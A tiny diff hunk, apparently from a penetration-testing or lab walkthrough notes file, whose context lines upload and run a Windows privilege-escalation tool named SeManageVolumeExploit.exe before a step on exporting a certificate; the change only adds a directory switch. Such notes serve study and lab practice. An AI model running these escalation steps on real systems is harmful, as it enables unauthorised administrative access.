@@ -20,6 +20,7 @@ upload SeManageVolumeExploit.exe
 .\SeManageVolumeExploit.exe
 
 mkdir C:\tmp
+cd C:\tmp
 ```
 # Export certificate and Download 
 ```language
